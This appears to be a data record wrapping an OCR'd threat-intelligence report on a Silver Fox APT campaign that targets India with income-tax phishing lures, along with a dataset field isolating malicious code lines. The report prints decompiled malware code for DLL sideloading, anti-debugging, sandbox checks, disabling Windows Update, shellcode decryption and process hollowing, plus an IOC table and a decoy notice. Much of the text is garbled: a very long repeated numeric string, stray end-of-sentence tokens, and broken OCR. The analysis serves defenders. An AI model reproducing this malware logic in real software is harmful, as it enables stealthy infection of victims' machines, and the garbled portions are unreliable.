Hash</td><td>f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa</td><td>Stage 3</td></tr><tr><td>Sha256 Hash</td><td>068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbed7741245a7ea97c</td><td>Stage 4</td></tr><tr><td>Domain</td><td>ggwk[.]cc</td><td>Embedded<br>Domain Within<br>Decoy Attachment</td></tr></table>\n\n<--- Page Split --->\n\n\n<table><tr><td>Indicator<br>Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Domain</td><td>b[.]yuxuanow[.]top</td><td>Shellcode C2</td></tr><tr><td>IP</td><td>45.207.231[.]94</td><td>Resolution from<br>ggwk[.]cc</td></tr><tr><td>IP</td><td>103.20.195[.]147</td><td>Resolution from<br>b[.]yuxuanow[.]top</td></tr></table>", "format_code": "Context.Eip=(DWORD)lpBaseAddress;", "hash": "hash"}
{"file_name": "fed9c11a-b86a-49a9-a9e2-24332f01a81c.md", "title": "Silver Fox Targeting India Using Tax Themed Phishing Lures", "malicious_code": "ResumeThread(lpProcessInformation->hThread);", "describe": "cloudsek.com/blog/silver- fox- targeting- india- using- tax- themed- phishing- lures  \n\nPrajwal Awasthi  \n\nTable of Content  \n\nSubscribe to CloudSEK Resources  \n\nGet the latest industry news, threats and resources.  \n\n## Executive Summary  \n\nCloudSEK's TRIAD discovered a campaign by Silver Fox APT targeting India with Income tax themed phishing lures. The lure is visually identical to the ones discovered by other vendors, however, this campaign has not been attributed to a specific threat actor before this report. Attribution accuracy is critical to threat intelligence; it enables defenders to predict adversary behavior and deploy targeted countermeasures. Misattribution from trusted sources propagates through threat feeds and detection systems, causing organizations to focus on the wrong threat while the actual adversary operates undetected. Attributing this campaign to SideWinder APT (India- aligned) contradicts basic victimology and creates systemic confusion. Using our report aims to highlight the sophisticated kill chain by the Chinese APT group, and explains the rationale behind CloudSEK's attribution.  \n\n## Kill Chain  \n\n<｜end▁of▁sentence｜>\n  \n\n## Initial Access Vector  \n\nTOPSOE INDIA PRIVATE LIMITED \n\n \n\nस्वरोचन ने अधिकार - Allgate/1/6/6/6/6/6/6/6/6/6/6/1/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/\n  \n\nMalicious email  \n\nWe found an interesting email uploaded from India with just an attachment called \"TOPsoE India Private Limited\". The pdf looked like an official Income Tax Department document. Upon clicking on the pdf, \"ggwk[.]cc\" opens up on the browser and a zip file called \"tax affairs.exe\" is downloaded.\n\n<--- Page Split --->\n\nNo. TAX/PEN/2025-142 \n\nभारत सरकार / Government of India\nवित्त मंत्रालय / Ministry of Finance\nआयकर विभाग / Income Tax Department\nप्रवर्तन प्रभाग / Enforcement Division \n\nAayakar Bhavan,\nNew Delhi - 110001 \n\nOFFICE MEMORANDUM \n\nSub: कर अनुपालन की कमी और दंड सूचना / Tax Compliance Deficiency and Penalty Notice \n\n1. आपकी कमनी की कर निरीक्षण के दौरान आयकर अधिनियम, 1961 की धारा 271(1)(c) के तहत कर संबंधी अनियमिताएं पाई गई हैं। The tax inspection of your company has revealed irregularities under Section 271(1)(c) of the Income Tax Act, 1961. \n\n2. इस सूचना की प्राप्ति के 72 घंटे (3 दिन) के भीतर निम्नलिखित दस्तावेज आयकर विभाग को प्रस्तुत करना अनिवार्य है। It is mandatory to submit the following documents to the Income Tax Department within 72 hours (3 days) of receipt of this notice. \n\nआवश्यक दस्तावेज सूची / Required Documents List\nनीचे दिए गए लिंक से दस्तावेज डाउनलोड करें / Download documents from the link below \n\nदस्तावेज डाउनलोड करें / Download Documents \n\n3. निर्धारित समयावधि में दस्तावेज प्रस्तुत न करने पर आयकर अधिनियम की धारा 276C के तहत कानूनी कार्रवाई की जाएगी। Legal action will be taken under Section 276C of the Income Tax Act if documents are not submitted within the stipulated time. \n\n(राज कुमार शर्मा) \n\nRaj Kumar Sharma \n\nसहायक आयकर आयुक्त \n\nAssistant Commissioner of Income Tax \n\nTechnical Analysis \n\nStage - 1: Tax Affairs.zip \n\nPE32 \n\nOperation system: Windows(2000)[1386, 32-bit, GUI] \n\nLinker: Microsoft Linker(10.00.40219) \n\nCompiler: Microsoft Visual C/C++(16.00.40219)[C] \n\nLanguage: C \n\nTool: Visual Studio(2010) \n\n(Heur) Packer: Compressed or packed data[Strange overlay] \n\nInstaller: Nullsoft Scriptable Install System(2.46.5-ANSI) \n\nOverlay: Binary[Offset=0x00034c00,Size=0x002a2e40] \n\nUnknown: Unknown \n\nDetect It Easy \n\nUsing static analysis we see that the given PE file is a 32 bit GUI binary. More importantly, the file is identified as a Nullsoft Scriptable Install system (NSIS) installer. NSIS installers embed their installation script, compressed payloads etc inside the binary itself and we can move ahead to analyse it as an installer driven staging payload.\n\n<--- Page Split --->\nGetTempPathA(0x10000u, PathName); \n\nif ( sub_4032CB() || (GetWindowsDirectoryA(PathName, 0xFFBu), lstrcatA(PathName, \"\\Temp\"), sub_4032CB()) \n\nDeleteFileA(FileName); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = (const char *)sub_403030(Buffer); \n\nif (!Error_writing_temporary_file._Make_sure_your_temp_folder_is_val ) \n\nif (!dword_433C24 ) \n\n{ \n\nABEL_34: \n\nuExitCode = -1; \n\nuExitCode = sub_4052E6(); \n\ngoto LABEL_35; \n\n} \n\nfor ( i = (CHAR *)sub_40567B(&sz, 0); i >= &sz && sub_4032FF(i, \"_=\", 4); --i ) \n\n; \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = \"Error launching installer\"; \n\nif ( i >= &sz ) \n\n{ \n\n* i = 0; \n\nlpString2_3 = i + 4; \n\nif ( !sub_405EFC(lpString2_3) ) \n\ngoto LABEL_35; \n\nlstrcpyAn_wrp(&lpString1_, lpString2_3); \n\nlstrcpyAn_wrp(Directory, lpString2_3); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = 0; \n\ngoto LABEL_34; \n\n} \n\nlstrcatA(PathName, \"\\nsu.tmp\"); \n\nif ( lstrcmpiA(PathName, ::lpString2) ) \n\n{ \n\nCreateDirectoryA(PathName, 0); \n\nSetCurrentDirectoryA(PathName); \n\nif ( !lpString1_ ) \n\nlstrcpyAn_wrp(&lpString1_, ::lpString2); \n\nlstrcpyAn_wrp(lpString1_, lpString2); \n\nlstrcpyAn_wrp(&lpString1_0, \"A\"); \n\nn26 = 26;<｜end▁of▁sentence｜>\n\n<center>NSIS Installer </center>  \n\nThe NSIS installer begins by resolving a writable temporary directory using GetTempPathA. If the operation fails, it falls back to C:\\Windows\\Temp, ensuring execution reliability. Once a valid location is identified, the installer creates an NSIS specific working directory (\\~nsu.tmp) and switches the directory to it.  \n\nDropped Files   \n\n<table><tr><td>ndoe &amp;gt; AppData &amp;gt; Local &amp;gt; Temp</td><td></td><td></td><td></td></tr><tr><td>Name</td><td>Date modified</td><td>Type</td><td>Size</td></tr><tr><td>Thunder.exe</td><td>7/24/2024 10:42 PM</td><td>Application</td><td>635 KB</td></tr><tr><td>FastAnimation.dll</td><td>5/27/2025 4:38 AM</td><td>Application extens...</td><td>578 KB</td></tr><tr><td>leakrepair.dll</td><td>5/27/2025 4:40 AM</td><td>Application extens...</td><td>716 KB</td></tr><tr><td>dynlbase.dll</td><td>5/27/2025 4:48 AM</td><td>Application extens...</td><td>1,431 KB</td></tr><tr><td>libaw.dat</td><td>5/27/2025 4:59 AM</td><td>DAT File</td><td>1,121 KB</td></tr><tr><td>DumpUper.ini</td><td>5/27/2025 5:01 AM</td><td>Configuration setti...</td><td>2 KB</td></tr><tr><td>libdefa.dat</td><td>9/16/2025 7:38 AM</td><td>DAT File</td><td>321 KB</td></tr><tr><td>box.ini</td><td>9/25/2025 8:00 PM</td><td>Configuration setti...</td><td>126 KB</td></tr><tr><td>libexpat.dll</td><td>9/25/2025 8:13 PM</td><td>Application extens...</td><td>32 KB</td></tr></table>  \n\nUpon analysis we found that only 2 files are of use to us, Thunder.exe and libexpat.dll. Thunder.exe is a legitimate, digitally signed executable developed by Xunlei (迅雷), commonly distributed as part of the Thunder download manager ecosystem. In this infection chain, the binary itself is not malicious but is abused as a DLL hijacking host. When executed from installer's temporary directory, Thunder.exe loads libexpat.dll from its local path due to default DLL search order. We can confirm this in x64dbg.\n\n<--- Page Split --->\npos: 0%\n\npush eax\n\njmp tax affairs.402008\n\npush F\n\ncall tax affairs.405A65\n\npush 64\n\npush dword ptr ss:[ebp+8]\n\ncall esi\n\ncmp eax,102\n\nje tax affairs.401FFC\n\nlea eax,dword ptr ss:[ebp-8]\n\npush eax\n\npush dword ptr ss:[ebp+8]\n\ncall dword ptr ds:[<GetExitCodeProcess>]\n\ncmp dword ptr ss:[ebp-20],ebx\n\njl tax affairs.40202E\n\npush dword ptr ss:[ebp-8]\n\npush edi\n\ncall tax affairs.40589E\n\njmp tax affairs.40203A\n\ncmp dword ptr ss:[ebp-8],ebx\n\nje tax affairs.40203A\n\nmov dword ptr ss:[ebp-4],1\n\npush dword ptr ss:[ebp+8]<｜end▁of▁sentence｜>\n\n<center>DLL Loading </center>  \n\n## Stage - 2 : libexpat.dll  \n\nThe dropped libexpat.dll does not export any meaningful functions and is never explicitly invoked by Thunder.exe.The dll relies on the windows loader functionality and calls the DLLMain. This callback is invoked unconditionally, regardless of whether the DLL exports any functions or is actively used by the host process.  \n\nLet's take a look at the working of the DLL.  \n\nv4 = IsDebuggerPresent(); \n\nv5 = &unk_100056DC; \n\nif (!v4) \n\nv5 = &unk_100056E4; \n\nLogStatus((char *)&Format_1, v5); \n\nif (v4) \n\n{ \n\nLogStatus((char *)&Format_2); \n\nreturn 0; \n\n} \n\nelse if (CheckSystemResources()) \n\nGetSystemInfo(&SystemInfo); \n\ndwNumberOfProcessors = SystemInfo.dwNumberOfProcessors; \n\nv7 = &unk_1000560C; \n\nif ( SystemInfo.dwNumberOfProcessors < 4 ) \n\nv7 = &unk_10005614; \n\nLogStatus(aCpu, SystemInfo.dwNumberOfProcessors, v7); \n\nif ( dwNumberOfProcessors >= 4 ) \n\n{ \n\nif (!(unsigned __int8)Persistence()) \n\nLogStatus((char *)&Format_3); \n\nToolHelp32Snapshot = CreateToolhelp32Snapshot(2u, 0); \n\nif ( ToolHelp32Snapshot != (HANDLE)-1 ) \n\n{ \n\npe.dwSize = 556; \n\nif ( Process32Firstw(Toolhelp32Snapshot, &pe) ) \n\n{ \n\ndo \n\n{ \n\nv9 = wcscmp(pe.szExeFile, L\"ida.exe\"); \n\nif ( v9 ) \n\nv9 = v9 < 0 ? -1 : 1; \n\nif (!v9 ) \n\nLogStatus((char *)&Format_4, pe.th32ProcessID); \n\nv10 = wcscmp(pe.szExeFile, L\"x64dbg.exe\"); \n\nif ( v10 ) \n\nv10 = v10 < 0 ? -1 : 1; \n\nif (!v10 ) \n\nLogStatus((char *)&Format_5, pe.th32ProcessID); \n\n} \n\nwhile ( Process32Nextw(Toolhelp32Snapshot, &pe) );<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nThe Main function begins by many anti debugging and sandbox techniques.The DLL performs process enumeration and scans the process list for common analysis and sandbox tools. Also the DLL queries for the system resources checking if minimum requirements are satisfied or not. In addition to that, if it detects any sandbox environment, it terminates the malware.  \n\nif (!DisableWindowsUpdateService() ) \n\nLogStatus((char *)&Format_6); \n\nBlock[0] = 0; \n\nBlock[1] = 0; \n\nv17 = 0; \n\nv18 = 0; \n\nif ( LoadAndDecryptPayload(Block) ) \n\nv11 = ProcessHollowing((int)Block); \n\nFormat = (char *)&unk_100059C0; \n\nif ( v11 ) \n\nFormat = (char *)&byte_100059CC; \n\n} \n\nelse \n\n} \n\nFormat = (char *)&unk_100059E0; \n\n} \n\nLogStatus(Format); \n\nDisableThreadLibraryCalls(hinstDLL); \n\nCreateThread(0, 0, StartAddress, 0, 0, 0); \n\nv13 = Block[0]; \n\nif ( Block[0] ) \n\n} \n\nif ( v17 - (unsigned int)Block[0] >= 0x1000 ) \n\nv13 = (void *)*((_DWORD *)Block[0] - 1); \n\nif ( (unsigned int)((char *)Block[0] - (char *)v13 - 4) > 0x1F ) \n\ninvalid_parameter_noinfo_noreturn(); \n\n} \n\nsub_10003E6E(v13);<｜end▁of▁sentence｜>\n\n<center>Payload Decryption </center>  \n\nOnce the DLL completes its anti analysis checks, it enters the core execution logic. It first disables the Windows Update service(wuauserv) then loads an encrypted payload from the disk. The payload is dynamically resolved and loads the box.ini file from the temporary directory. The file is fully read into memory, decrypted using embedded cryptographic constants and later on executed as shellcode.  \n\n<table><tr><td>00</td><td>01</td><td>02</td><td>03</td><td>04</td><td>05</td><td>06</td><td>07</td><td>08</td><td>09</td><td>OA</td><td>OB</td><td>OC</td><td>OD</td><td>OE</td><td>OF</td></tr><tr><td>9B</td><td>80</td><td>9D</td><td>8E</td><td>89</td><td>C3</td><td>23</td><td>6B</td><td>A6</td><td>95</td><td>C5</td><td>FC</td><td>B7</td><td>2A</td><td>CB</td><td>OD</td></tr><tr><td>D4</td><td>CF</td><td>6B</td><td>FF</td><td>F8</td><td>6F</td><td>AC</td><td>9C</td><td>D8</td><td>94</td><td>6A</td><td>50</td><td>32</td><td>F0</td><td>B1</td><td>FC</td></tr><tr><td>E1</td><td>29</td><td>25</td><td>0D</td><td>5A</td><td>2A</td><td>E7</td><td>A3</td><td>4C</td><td>7B</td><td>54</td><td>A1</td><td>F7</td><td>2B</td><td>4E</td><td>60</td></tr><tr><td>14</td><td>CF</td><td>71</td><td>43</td><td>65</td><td>4B</td><td>B3</td><td>12</td><td>80</td><td>73</td><td>54</td><td>F5</td><td>A4</td><td>0B</td><td>ED</td><td>71</td></tr><tr><td>A6</td><td>6B</td><td>6B</td><td>5C</td><td>0D</td><td>6F</td><td>57</td><td>F0</td><td>F8</td><td>C3</td><td>F6</td><td>15</td><td>F2</td><td>8F</td><td>81</td><td>EB</td></tr><tr><td>6C</td><td>18</td><td>A0</td><td>F4</td><td>DB</td><td>9F</td><td>47</td><td>00</td><td>8C</td><td>A7</td><td>CE</td><td>0E</td><td>EB</td><td>92</td><td>CF</td><td>89</td></tr><tr><td>83</td><td>87</td><td>D0</td><td>70</td><td>D4</td><td>C9</td><td>42</td><td>64</td><td>BF</td><td>78</td><td>8D</td><td>C5</td><td>84</td><td>93</td><td>9B</td><td>90</td></tr><tr><td>74</td><td>BA</td><td>DE</td><td>B5</td><td>E8</td><td>A1</td><td>86</td><td>44</td><td>CC</td><td>AD</td><td>C3</td><td>C0</td><td>7C</td><td>A1</td><td>94</td><td>6F</td></tr><tr><td>54</td><td>62</td><td>72</td><td>F8</td><td>9F</td><td>6F</td><td>C4</td><td>R9</td><td>07</td><td>19</td><td>1D</td><td>F7</td><td>6F</td><td>17</td><td>DN</td><td>8F</td></tr></table>\n\nDecoded text \n\n\"E.ZNA#k!·Aü·*E.\nÖİkyoo-oeo\"jP2&tü\ná)%.Z*ç£L(Tj÷+N'\n.İqCeK°.eStÖn.iq\n!kk\\.ow&oAö.ö..ë\n1. öÜYG.ÇSİ.ë'İn\nf#DpÖÉBdžx.Ä„“>.\nt°Pue;tDİ.ÄÄ|;\"o\nThræšnÄi...-n.ÝÝ<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\nStartupInfo.dwFlags = STARTF_USESHOWWINDOW; \n\nmemset(&StartupInfo.wShowWindow, 0, 20); \n\nif ( GetFileAttributesA(\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\") == -1 ) \n\nLastError = GetLastError(); \n\nLogStatus((char *)&Format_17, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", LastError); return 0; 